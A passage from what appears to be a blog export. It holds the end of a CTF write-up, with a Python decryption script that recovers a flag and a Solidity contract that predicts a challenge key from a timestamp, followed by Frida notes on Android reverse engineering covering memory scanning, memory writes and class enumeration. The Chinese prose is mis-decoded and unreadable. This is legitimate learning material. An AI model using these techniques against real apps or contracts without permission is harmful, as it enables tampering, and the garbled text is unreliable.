0xDE18190C, 0x6FEB4BA5, 0xEB719056, 0xEFAA7CFE, 0x100F8A13, 0x4E4AFD17, 0xD66DF5F1, 0xFB06B85D, 0x445AAFC0, 0x3B9F8385, 0x1B5330AF, 0xED70B42D, 0x2F2D81BC, 0x11873849, 0x5E65E5AB, 0xADF9C568, 0xACB45611, 0x59583575, 0xEB1C07F7, 0xB9E9BDF1, 0x65EB1D3D, 0xFA5FE526, 0x93C100A5, 0x2E414BC7, 0x7B0F062E, 0xCE77979B, 0x334965BB, 0x50BD7300, 0xE4273979, 0xC0EB2C14, 0x6E278874, 0x30523462, 0xF5D59CB2, 0xCA284788, 0xB84443BF, 0x1B7BDE26]final = [0x9DDC359E, 0xF8288ABF, 0x9E1989CA, 0x59224ADB, 0xEFDEF866, 0xFC0BB7EB, 0x02D5C68A, 0xB3AC36F3, 0xDFBDAC75, 0x5F414DF0]result = [0,0]for n in range(5): result[0] = deal_last_rev(final[2 * n]) result[1] = deal_last_rev(final[2 * n + 1]) result[0], result[1] = result[1], result[0] result[0] ^= a4[16] result[1] ^= a4[17] for i in range(15, -1, -1): v12, v11 = result[0], result[1] result[0] = v11 ^ a4[i] result[1] =v12 ^ ctypes.c_uint(a4[(v11 &amp; 0xFF) + 786] + ( a4[((v11 >> 8) &amp; 0xFF) + 530] ^ (a4[((v11 >> 24) &amp; 0xFF) + 18] + a4[((v11 >> 16) &amp; 0xFF) + 274]))).value print(str(binascii.a2b_hex(hex(rrev(result[0]))[2::]),encoding='utf-8'),end='') print(str(binascii.a2b_hex(hex(rrev(result[1]))[2::]), encoding='utf-8'), end='')# flag&#123;W3lc0me_t0_Th3_Mu1lt1_Un1v3rs3!!!!&#125;# blockchain # åˆ°å›½é“¾ä¹‹å…‰ä¸€æ¸¸ ä¸€é“ç®€å•çš„åŒºå—é“¾é¢˜ç›®ï¼Œå»å¹´ b ç«™ 1024 ç¨‹åºå‘˜èŠ‚çš„æ—¶å€™åšäº†ä¸€é“åŒºå—é“¾ï¼Œé‚£ä¸€é¢˜çš„ wp åœ¨è¿™é‡Œï¼Œå’Œè¿™é¢˜è€ƒçš„çŸ¥è¯†ç‚¹çš„å…³ç³»åº”è¯¥æ˜¯åŒ…å«å§ï¼Œè¿™é¢˜è€ƒçš„çŸ¥è¯†ç‚¹ b ç«™çš„é‚£é¢˜ä¹Ÿæœ‰ï¼Œæ‰€ä»¥åšèµ·æ¥å½“ç„¶æ˜¯å¾ˆè½»æ¾çš„ï¼Œç›´æ¥ä¸Šæ”»å‡»åˆçº¦å§ contract Solve &#123; Greeter public greeter; SignIn public signin; uint signinTimestamp; constructor(address _addr) &#123; greeter = Greeter(_addr); signin = SignIn(greeter.startChallenge()); signinTimestamp = block.timestamp; // è®°å½• SignIn éƒ¨ç½²æ—¶é—´æˆ³ &#125; function solve() public &#123; bytes32 key = keccak256(abi.encodePacked(signinTimestamp)); signin.getFlag(key); &#125;&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"pythoné€†å‘","slug":"pythoné€†å‘","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"goé€†å‘","slug":"goé€†å‘","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"}]},{"title":"fridaå­¦ä¹ ç¬”è®°-å®‰å“é€†å‘","slug":"fridaå­¦ä¹ ç¬”è®°-å®‰å“é€†å‘","date":"2023-04-05T04:36:01.000Z","updated":"2024-07-15T03:29:51.051Z","comments":true,"path":"fridaå­¦ä¹ ç¬”è®°-å®‰å“é€†å‘/","link":"","permalink":"https://oacia.dev/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/","excerpt":"","text":"è¿‘æœŸç€æ‰‹å‡†å¤‡ç ”ç©¶å®‰å“é€†å‘ï¼Œæ—©å°±å¬è¯´ frida è¿™ä¸ªå®‰å“é€†å‘ç¥å™¨ï¼Œæ‰€ä»¥æƒ³è¦ç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹ï¼Œè¿™é‡Œå°±å½“ä½œè‡ªå·±çš„ä¸€ä¸ªå­¦ä¹ ç¬”è®°ï¼Œè®°å½•æœ¬äººå­¦ä¹  frida çš„è¿‡ç¨‹ä¸­æ‰€é‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œé˜²æ­¢ä»¥åé—å¿˜. è¿™æ¬¡çš„å­¦ä¹ æ•™ç¨‹æ˜¯ç”± r0ysue å¤§ä½¬å†™çš„ï¼Œè†œæ‹œï¼ https://github.com/r0ysue/AndroidSecurityStudy # frida çš„å‘½ä»¤è¡ŒåŸºæœ¬è¯­æ³• frida -U -l .\\srcipt.js -f \"com.oacia.frida_a02_01_demo2\" -U æŒ‡ç”¨ USB è¿æ¥æ‰‹æœºå’Œç”µè„‘ -l load-file, æ‰€ä»¥åé¢è¦è·Ÿä¸Šå†™å¥½çš„ frida è„šæœ¬ -f file name, æ‰€ä»¥åé¢è¦è·Ÿä¸Šä½ éœ€è¦æ³¨å…¥çš„åŒ…çš„åç§° ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯å† pycharm ä¸­å®ç° frida çš„ä»£ç è¡¥å…¨ npm i @types/frida-gum# JavaScript API å­¦ä¹  frida æœ€é‡è¦çš„æ˜¯ä» API å…¥æ‰‹ï¼Œå› ä¸ºä½ è¿æœ€åŸºç¡€çš„å·¥å…·éƒ½ä¸çŸ¥é“æ€ä¹ˆä½¿ç”¨é‚£è¿˜æ€ä¹ˆå»ºæˆ¿å­å˜ï¼š) è¿™æ˜¯å®˜æ–¹ç»™å‡ºçš„ API æ–‡æ¡£: https://frida.re/docs/javascript-api/ æ¥ä¸‹æ¥çš„å†…å®¹æ˜¯å¯¹ API ä½œç”¨çš„è§£é‡Šä»¥åŠç¤ºä¾‹ # console å‡è®¾ console.log(data) æ‰“å°å‡ºæ¥çš„ç»“æœæ˜¯ [object Object] ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ console.log(data.value) æ¥æ‰“å°ä»–çš„å€¼ã€‚ # hexdump hexdump æ˜¯ç”¨æ¥æ‰“å°å†…å­˜ç©ºé—´çš„å€¼ï¼Œå¯ä»¥è¯´æ˜¯ç›¸å½“ä¾¿æ·çš„æŸ¥çœ‹å†…å­˜çš„æ–¹å¼äº†ï¼Œç”¨æ³•å¦‚ä¸‹ const libc = Module.findBaseAddress('libc.so');// è·å– so çš„åŸºå€console.log(hexdump(libc, &#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true&#125;)); 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 .ELF............00000010 03 00 28 00 01 00 00 00 00 00 00 00 34 00 00 00 ..(.........4...00000020 34 a8 04 00 00 00 00 05 34 00 20 00 08 00 28 00 4.......4. ...(.00000030 1e 00 1d 00 06 00 00 00 34 00 00 00 34 00 00 00 ........4...4...# Module å¯¹è±¡ # findExportByName é€šè¿‡å¯¼å‡ºè¡¨çš„å‡½æ•°åç§°æ¥è·å–å‡½æ•°åœ¨ so æ–‡ä»¶ä¸­çš„ç»å¯¹åœ°å€ function frida_Module() &#123; Java.perform(function () &#123; Module.getExportByName('libhello.so', 'c_getStr') console.log(\"Java_com_roysue_roysueapplication_hellojni_getStr address:\",Module.findExportByName('libhello.so', 'Java_com_roysue_roysueapplication_hellojni_getStr'));&#125;setImmediate(frida_Module,0);è¾“å‡ºå¦‚ä¸‹ï¼šJava_com_roysue_roysueapplication_hellojni_getStr address: 0xdf2d413d# enumerateImports æšä¸¾ so çš„å¯¼å…¥è¡¨ var imports=Module.enumerateImports(\"libencryptlib.so\")for(var i=0;i&lt;imports.length;i++)&#123; // console.log(JSON.stringify(imports[i])); console.log(imports[i].name+\" \"+imports[i].address);&#125;# enumerateExports æšä¸¾ so çš„å¯¼å‡ºè¡¨ var exports=Module.enumerateExports(\"libencryptlib.so\")for(var i=0;i&lt;exports.length;i++)&#123; console.log(exports[i].name+\" \"+exports[i].address);&#125;# enumerateSymbols æšä¸¾ so çš„ç¬¦å·è¡¨ var symbols=Module.enumerateSymbols(\"libencryptlib.so\")for(var i=0;i&lt;symbols.length;i++)&#123; console.log(symbols[i].name+\" \"+symbols[i].address);&#125;# Memory å¯¹è±¡ è¿™ä¸ªå¯¹è±¡ä¸»è¦å¯¹å†…å­˜è¿›è¡Œè¯»å–æˆ–å†™å…¥ # scan å…¶ä¸»è¦åŠŸèƒ½æ˜¯æœç´¢å†…å­˜ä¸­ä»¥ address åœ°å€å¼€å§‹ï¼Œæœç´¢é•¿åº¦ä¸º size ï¼Œéœ€è¦æœç´¢çš„æ¡ä»¶æ˜¯ pattern , æ­¤å‡½æ•°ç›¸å½“äºæœç´¢å†…å­˜çš„åŠŸèƒ½ã€‚ function frida_Memory() &#123; Java.perform(function () &#123; // å…ˆè·å– so çš„ module å¯¹è±¡ var module = Process.findModuleByName(\"libhello.so\"); //?? æ˜¯é€šé…ç¬¦ var pattern = \"03 49 ?? 50 20 44\"; // åŸºå€ console.log(\"base:\"+module.base) // ä» so çš„åŸºå€å¼€å§‹æœç´¢ï¼Œæœç´¢å¤§å°ä¸º so æ–‡ä»¶çš„å¤§å°ï¼ŒæœæŒ‡å®šæ¡ä»¶ 03 49 ?? 50 20 44 çš„æ•°æ® var res = Memory.scan(module.base, module.size, pattern, &#123; onMatch: function(address, size)&#123; // æœç´¢æˆåŠŸ console.log('æœç´¢åˆ° ' +pattern +\" åœ°å€æ˜¯:\"+ address.toString()); &#125;, onError: function(reason)&#123; // æœç´¢å¤±è´¥ console.log('æœç´¢å¤±è´¥'); &#125;, onComplete: function() &#123; // æœç´¢å®Œæ¯• console.log(\"æœç´¢å®Œæ¯•\") &#125; &#125;); &#125;);&#125;setImmediate(frida_Memory,0);# writeByteArray å°†å­—èŠ‚æ•°ç»„å†™å…¥ä¸€ä¸ªæŒ‡å®šå†…å­˜ function frida_Memory() &#123; Java.perform(function () &#123; // å®šä¹‰éœ€è¦å†™å…¥çš„å­—èŠ‚æ•°ç»„ è¿™ä¸ªå­—èŠ‚æ•°ç»„æ˜¯å­—ç¬¦ä¸² \"roysue\" çš„åå…­è¿›åˆ¶ var arr = [ 0x72, 0x6F, 0x79, 0x73, 0x75, 0x65]; // ç”³è¯·ä¸€ä¸ªæ–°çš„å†…å­˜ç©ºé—´ è¿”å›æŒ‡é’ˆ å¤§å°æ˜¯ arr.length const r = Memory.alloc(arr.length); // å°† arr æ•°ç»„å†™å…¥ R åœ°å€ä¸­ Memory.writeByteArray(r,arr); // è¾“å‡º console.log(hexdump(r, &#123; offset: 0, length: arr.length, header: true, ansi: false &#125;)); &#125;);&#125;setImmediate(frida_Memory,0);è¾“å‡ºå¦‚ä¸‹ã€‚ 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 72 6f 79 73 75 65 roysue# readByteArray è¯»å–ä¸€ä¸ªæŒ‡å®šåœ°å€çš„æ•°æ® function frida_Memory() &#123; Java.perform(function () &#123; // å®šä¹‰éœ€è¦å†™å…¥çš„å­—èŠ‚æ•°ç»„ è¿™ä¸ªå­—èŠ‚æ•°ç»„æ˜¯å­—ç¬¦ä¸² \"roysue\" çš„åå…­è¿›åˆ¶ var arr = [ 0x72, 0x6F, 0x79, 0x73, 0x75, 0x65]; // ç”³è¯·ä¸€ä¸ªæ–°çš„å†…å­˜ç©ºé—´ è¿”å›æŒ‡é’ˆ å¤§å°æ˜¯ arr.length const r = Memory.alloc(arr.length); // å°† arr æ•°ç»„å†™å…¥ R åœ°å€ä¸­ Memory.writeByteArray(r,arr); // è¯»å– r æŒ‡é’ˆï¼Œé•¿åº¦æ˜¯ arr.length ä¹Ÿå°±æ˜¯ä¼šæ‰“å°ä¸Šé¢ä¸€æ ·çš„å€¼ var buffer = Memory.readByteArray(r, arr.length); // è¾“å‡º console.log(\"Memory.readByteArray:\"); console.log(hexdump(buffer, &#123; offset: 0, length: arr.length, header: true, ansi: false &#125;)); &#125;); &#125;);&#125;setImmediate(frida_Memory,0);è¾“å‡ºå¦‚ä¸‹ã€‚[Google Pixel::com.roysue.roysueapplication]-> Memory.readByteArray: 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 72 6f 79 73 75 65 roysue# Java å¯¹è±¡ # available è¯¥å‡½æ•°ä¸€èˆ¬ç”¨æ¥åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦åŠ è½½äº† JavaVM ï¼Œ Dalvik æˆ– ART è™šæ‹Ÿæœº function frida_Java()&#123; Java.perform(function()&#123; // å½“å‰è¿›ç¨‹æ˜¯å¦åŠ è½½äº† JavaVMï¼ŒDalvik æˆ– ART è™šæ‹Ÿæœº if(Java.available)&#123; console.log(\"å½“å‰è¿›ç¨‹åŠ è½½äº†JavaVMï¼ŒDalvikæˆ–ARTè™šæ‹Ÿæœº!!!\"); &#125; else&#123; console.log(\"error: ä¸èƒ½æ­£å¸¸åŠ è½½è™šæ‹Ÿæœº!!!\"); &#125; &#125;)&#125;setImmediate(frida_Java,0)//[SM P200::com.oacia.frida_a02_01_demo2 ]-> my android version is 9 amazing~# androidVersion æ˜¾ç¤º android ç³»ç»Ÿç‰ˆæœ¬å· function frida_Java()&#123; Java.perform(function()&#123; if(Java.available)&#123; console.log(\"my android version is \",Java.androidVersion,\"amazing~\"); &#125; else&#123; console.log(\"ERROR\"); &#125; &#125;) &#125;setImmediate(frida_Java,0);//[SM P200::com.oacia.frida_a02_01_demo2]-> å½“å‰è¿›ç¨‹åŠ è½½äº† JavaVMï¼ŒDalvik æˆ– ART è™šæ‹Ÿæœºï¼ï¼ï¼# enumerateLoadedClasses è¯¥ API æšä¸¾å½“å‰åŠ è½½çš„æ‰€æœ‰ç±»ä¿¡æ¯ï¼Œå®ƒæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°åˆ†åˆ«æ˜¯ onMatch: function(classname) ã€ onComplete: function() å‡½æ•° function frida_Java()&#123; Java.perform(function()&#123; if(Java.available)&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(classname)&#123; console.log(\"\",classname); &#125;, onComplete: function()&#123; console.log(\"all classes log done~\"); &#125; &#125;) &#125; else&#123; console.log(\"error\"); &#125; &#125;)&#125;//function frida_Java_out_class_include_Android()&#123; Java.perform(function()&#123; if(Java.available)&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(classname)&#123; if(classname.includes(\"Android\"))&#123; console.log(\"\",classname); &#125; &#125;, onComplete: function()&#123; console.log(\"all classes that includes &lt;Android> log done~\"); &#125; &#125;) &#125; else&#123; console.log(\"error\"); &#125; &#125;)&#125;//setImmediate(frida_Java,0);/** * è¾“å‡ºå¤ªå¤šå“©ï¼Œè¿™é‡Œå°±æˆªå–ä¸€ç‚¹å§ [Landroid.graphics.Bitmap; com.samsung.android.hardware.display.SemMdnieManager sun.net.www.MessageHeader [Landroid.graphics.drawable.Drawable; android.content.pm.split.SplitDependencyLoader com.sec.tima.TimaKeyStoreProvider [Landroid.content.pm.PathPermission; com.samsung.android.multiwindow.MultiWindowCoreState [Landroid.os.PatternMatcher; android.app.servertransaction.CoreStatesChangeItem com.sec.tima.TimaKeyStore com.samsung.android.app.CoreStatePool android.app.LoadedApk$SplitDependencyLoaderImpl com.samsung.android.multiwindow.SideScreenCoreState com.samsung.android.app.CoreState [Landroid.system.StructPollfd; android.app.servertransaction.CoreStatesChangeItem$1 androidx.core.app.CoreComponentFactory$CompatWrapped androidx.core.app.CoreComponentFactoryall classes log done~ */setImmediate(frida_Java_out_class_include_Android,0);/**com.android.org.bouncycastle.crypto.digests.AndroidDigestFactory com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryInterface com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryOpenSSL com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryBouncyCastle com.android.okhttp.AndroidShimResponseCache com.android.okhttp.AndroidInternal android.icu.text.DecimalFormat_ICU58_Android$Unit android.icu.text.DigitList_Android android.icu.text.DecimalFormat_ICU58_Android java.lang.AndroidHardcodedSystemProperties android.security.keystore.KnoxAndroidKeyStoreProviderall classes that includes &lt;Android> log done~ */# enumerateClassLoaders è¯¥ api æšä¸¾ Java VM ä¸­å­˜åœ¨çš„ç±»åŠ è½½å™¨ï¼Œå…¶æœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ onMatch: function (loader) ä¸ onComplete: function () æšä¸¾ç±» Java.enumerateLoadedClasses å’Œæšä¸¾ç±»åŠ è½½å™¨ Java.enumerateClassLoaders ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ åœ¨ Frida ä¸­ï¼Œ Java.enumerateLoadedClasses() æ–¹æ³•ç”¨äºæšä¸¾å½“å‰è¿›ç¨‹ä¸­åŠ è½½çš„æ‰€æœ‰ Java ç±»ã€‚è¿™äº› Java ç±»åŒ…æ‹¬åº”ç”¨ç¨‹åºè‡ªèº«çš„ç±»ï¼Œä»¥åŠæ‰€æœ‰ä¾èµ–åº“å’Œç³»ç»Ÿç±»ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªç±»åæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æ‰€æœ‰å·²åŠ è½½çš„ç±»åã€‚ Java.enumerateClassLoaders() æ–¹æ³•ç”¨äºæšä¸¾å½“å‰è¿›ç¨‹ä¸­æ‰€æœ‰çš„ Java ç±»åŠ è½½å™¨ã€‚åœ¨ Java è™šæ‹Ÿæœºä¸­ï¼Œæ¯ä¸ªç±»éƒ½ç”±å…¶ç±»åŠ è½½å™¨åŠ è½½ã€‚åœ¨ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªç±»åŠ è½½å™¨ï¼Œæ¯ä¸ªåŠ è½½å™¨éƒ½æœ‰ä¸åŒçš„èŒè´£å’Œä½œç”¨åŸŸã€‚ä½¿ç”¨ Java.enumerateClassLoaders() æ–¹æ³•ï¼Œå¯ä»¥æšä¸¾æ‰€æœ‰å·²ç»åˆ›å»ºçš„ç±»åŠ è½½å™¨ï¼Œè·å–å®ƒä»¬çš„å¼•ç”¨ï¼Œå¹¶è¿›ä¸€æ­¥åˆ†æå’Œä¿®æ”¹å®ƒä»¬åŠ è½½çš„ç±»çš„è¡Œä¸ºã€‚ Java.enumerateLoadedClasses() æ–¹æ³•å’Œ Java.enumerateClassLoaders() æ–¹æ³•éƒ½å¯ä»¥ç”¨äºæšä¸¾ Java ç±»ï¼Œä½†æ˜¯å®ƒä»¬çš„ä½œç”¨æœ‰æ‰€ä¸åŒã€‚ Java.enumerateLoadedClasses() æ–¹æ³•ç”¨äºæšä¸¾å½“å‰è¿›ç¨‹ä¸­å·²ç»åŠ è½½çš„ Java ç±»ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºè‡ªèº«çš„ç±»ã€ç³»ç»Ÿç±»å’Œä¾èµ–åº“ä¸­çš„ç±»ã€‚è¿™äº›ç±»å·²ç»è¢«åŠ è½½åˆ° Java è™šæ‹Ÿæœºä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å’Œè°ƒç”¨ã€‚ Java.enumerateClassLoaders() æ–¹æ³•ç”¨äºæšä¸¾å½“å‰è¿›ç¨‹ä¸­æ‰€æœ‰çš„ Java ç±»åŠ è½½å™¨ã€‚ç±»åŠ è½½å™¨æ˜¯ Java è™šæ‹Ÿæœºç”¨äºåŠ è½½å’Œåˆå§‹åŒ– Java ç±»çš„ç»„ä»¶ï¼Œå®ƒè´Ÿè´£ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œæˆ–å…¶ä»–æ¥æºè¯»å–ç±»å­—èŠ‚ç ï¼Œå¹¶è½¬æ¢ä¸º Java å¯¹è±¡ã€‚æšä¸¾ç±»åŠ è½½å™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£åº”ç”¨ç¨‹åºçš„ç±»åŠ è½½æœºåˆ¶ï¼Œå®šä½å’Œä¿®æ”¹ç±»åŠ è½½è¡Œä¸ºã€‚ å› æ­¤ï¼Œä¸¤ä¸ªæ–¹æ³•çš„ä½œç”¨ä¸åŒï¼Œå¦‚æœéœ€è¦åˆ†æå’Œä¿®æ”¹å·²ç»åŠ è½½çš„ç±»çš„è¡Œä¸ºï¼Œå¯ä»¥ä½¿ç”¨ Java.enumerateLoadedClasses() æ–¹æ³•ï¼›å¦‚æœéœ€è¦äº†è§£ç±»åŠ è½½å™¨çš„æœºåˆ¶ï¼Œå®šä½å’Œ Hook ç±»åŠ è½½å™¨çš„è¡Œä¸ºï¼Œå¯ä»¥ä½¿ç”¨ Java.enumerateClassLoaders() æ–¹æ³•ã€‚ ä»€ä¹ˆæ˜¯ Java ç±»ï¼Ÿ Java ç±»æ˜¯ä¸€ç§å°è£…äº†æ•°æ®å’Œè¡Œä¸ºçš„ç¨‹åºå•å…ƒï¼Œæ˜¯ Java è¯­è¨€ä¸­æœ€åŸºæœ¬çš„æ¦‚å¿µä¹‹ä¸€ã€‚Java ç±»å®šä¹‰äº†ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼Œæè¿°äº†å¯¹è±¡çš„ç‰¹å¾å’Œè¡Œä¸ºï¼Œå¯ä»¥è¢«å®ä¾‹åŒ–æˆå…·ä½“çš„å¯¹è±¡ã€‚ åœ¨ Java ä¸­ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½å¿…é¡»å®šä¹‰åœ¨ç±»ä¸­ï¼Œè€Œæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªåå­—ï¼Œç”¨æ¥æ ‡è¯†è¯¥ç±»çš„å”¯ä¸€æ€§ã€‚ç±»åé€šå¸¸é‡‡ç”¨é©¼å³°å‘½åæ³•ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œä¾‹å¦‚ï¼šPersonã€Studentã€Car ç­‰ã€‚ ç±»åŒ…å«ä¸¤ç§æˆå‘˜ï¼šå±æ€§å’Œæ–¹æ³•ã€‚å±æ€§æ˜¯ç±»çš„æˆå‘˜å˜é‡ï¼Œç”¨æ¥æè¿°å¯¹è±¡çš„æ•°æ®ç‰¹å¾ï¼Œä¾‹å¦‚ï¼šäººçš„å§“åã€å¹´é¾„ã€æ€§åˆ«ç­‰ã€‚æ–¹æ³•æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œç”¨æ¥æè¿°å¯¹è±¡çš„è¡Œä¸ºç‰¹å¾ï¼Œä¾‹å¦‚ï¼šäººçš„èµ°è·¯ã€è¯´è¯ã€åƒé¥­ç­‰ã€‚ åœ¨ Java ä¸­ï¼Œç±»æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„åŸºæœ¬å•ä½ï¼Œä¸€ä¸ª Java ç¨‹åºå¯ä»¥ç”±å¤šä¸ªç±»ç»„æˆï¼Œè€Œä¸”ç±»ä¹‹é—´å¯ä»¥å»ºç«‹ç»§æ‰¿å…³ç³»å’Œç»„åˆå…³ç³»ï¼Œä»è€Œå®ç°æ›´åŠ å¤æ‚çš„ç¼–ç¨‹é€»è¾‘ã€‚åŒæ—¶ï¼ŒJava ç±»çš„å®šä¹‰å’Œå®ç°éƒ½å…·æœ‰å¯é‡ç”¨æ€§å’Œæ‰©å±•æ€§ï¼Œæ–¹ä¾¿è¿›è¡Œä»£ç çš„ç»´æŠ¤å’Œæ›´æ–°ã€‚ // ä¸€ä¸ªç®€å•çš„ Java ç±»çš„ä¾‹å­public class Person &#123;// ç±»çš„åç§° private String name;// å±æ€§ private int age;// å±æ€§ public Person(String name, int age) &#123;// æ„é€ æ–¹æ³• this.name = name; this.age = age; &#125; public void sayHello() &#123; System.out.println(\"Hello, my name is \" + name + \", and I am \" + age + \" years old.\"); &#125; public void setAge(int age) &#123;// ä¿®æ”¹å™¨æ–¹æ³• this.age = age; &#125; public int getAge() &#123;// è®¿é—®å™¨æ–¹æ³• return age; &#125; public String getName() &#123;// è®¿é—®å™¨æ–¹æ³• return name; &#125;&#125; ä»€ä¹ˆæ˜¯ Java ç±»åŠ è½½å™¨ï¼Ÿ åœ¨ Java ä¸­ï¼Œç±»åŠ è½½å™¨æ˜¯ç”¨æ¥åŠ è½½ Java ç±»çš„ç»„ä»¶ï¼Œå®ƒå°†ç±»çš„äºŒè¿›åˆ¶æ•°æ®ä»ä¸åŒçš„æ•°æ®æºï¼ˆå¦‚æœ¬åœ°æ–‡ä»¶ã€ç½‘ç»œç­‰ï¼‰ä¸­åŠ è½½åˆ° Java è™šæ‹Ÿæœºä¸­ï¼Œå¹¶è½¬åŒ–æˆä¸€ä¸ª Java å¯¹è±¡ï¼Œä½¿å¾—ç¨‹åºå¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚ Java ç±»åŠ è½½å™¨ä¸»è¦è´Ÿè´£ä¸‰ä¸ªä»»åŠ¡ï¼š åŠ è½½ï¼šä»å¤–éƒ¨è·å–ç±»çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶å°†å…¶è½¬åŒ–æˆå†…éƒ¨è¡¨ç¤ºçš„ Class å¯¹è±¡ã€‚ è¿æ¥ï¼šå°†ç±»çš„äºŒè¿›åˆ¶æ•°æ®åˆå¹¶åˆ° Java è™šæ‹Ÿæœºä¸­ï¼Œç”Ÿæˆå¯ä»¥æ‰§è¡Œçš„ä»£ç ã€‚ åˆå§‹åŒ–ï¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼ŒåŒ…æ‹¬é™æ€å˜é‡çš„èµ‹å€¼ç­‰æ“ä½œã€‚ Java ç±»åŠ è½½å™¨æ ¹æ®ç±»æ‰€åœ¨çš„è·¯å¾„å’Œ ClassLoader ä¹‹é—´çš„çˆ¶å­å…³ç³»ï¼Œåˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ï¼š å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰ï¼šè´Ÿè´£åŠ è½½ JRE æ ¸å¿ƒåº“ä¸­çš„ç±»ï¼Œæ˜¯æ‰€æœ‰ç±»åŠ è½½å™¨çš„ç¥–å…ˆï¼Œä½¿ç”¨ C++ ç¼–å†™ï¼Œæ— æ³•è¢« Java ä»£ç è®¿é—®ã€‚ æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension ClassLoaderï¼‰ï¼šè´Ÿè´£åŠ è½½ Java æ‰©å±•åº“ä¸­çš„ç±»ï¼Œä¾‹å¦‚ï¼šJRE çš„ lib/ext ç›®å½•ä¸‹çš„ç±»ã€‚ ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystem ClassLoaderï¼‰ï¼šè´Ÿè´£åŠ è½½åº”ç”¨ç¨‹åº classpath ä¸‹çš„ç±»ï¼Œæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚ è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼šç»§æ‰¿ ClassLoader ç±»ï¼Œå¹¶é‡å†™ loadClass () æ–¹æ³•ï¼Œå®ç°è‡ªå·±çš„ç±»åŠ è½½é€»è¾‘ã€‚ // è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„ä¾‹å­public class MyClassLoader extends ClassLoader &#123; @Override protected Class&lt;?> findClass(String name) throws ClassNotFoundException &#123;// é‡å†™ findClass () æ–¹æ³• byte[] data = getClassData(name); if (data != null) &#123; return defineClass(name, data, 0, data.length); &#125; throw new ClassNotFoundException(name); &#125; private byte[] getClassData(String name) &#123; // ä»å¤–éƒ¨è·å–ç±»çš„äºŒè¿›åˆ¶æ•°æ® // ... &#125;&#125;ä¸¾ä¸ªä¾‹å­ æ¯”å¦‚æˆ‘ä»¬è¦ Hook ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æŸä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£è¿™ä¸ªæ–¹æ³•æ‰€åœ¨çš„ç±»å’Œç±»åŠ è½½å™¨ï¼Œä»¥åŠè¿™ä¸ªç±»æ˜¯å¦å·²ç»è¢«åŠ è½½è¿›å…¥ Java è™šæ‹Ÿæœºã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Java.enumerateLoadedClasses() æ–¹æ³•æ¥æšä¸¾å½“å‰è¿›ç¨‹ä¸­æ‰€æœ‰å·²ç»åŠ è½½çš„ç±»ï¼ŒæŸ¥æ‰¾ç›®æ ‡ç±»ã€‚å¦‚æœç›®æ ‡ç±»æ²¡æœ‰è¢«åŠ è½½ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Java.enumerateClassLoaders() æ–¹æ³•æ¥æšä¸¾å½“å‰è¿›ç¨‹ä¸­æ‰€æœ‰çš„ç±»åŠ è½½å™¨ï¼ŒæŸ¥æ‰¾ç›®æ ‡ç±»æ‰€åœ¨çš„ç±»åŠ è½½å™¨ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨åŠ è½½ç›®æ ‡ç±»ï¼Œæœ€ç»ˆå®šä½åˆ°ç›®æ 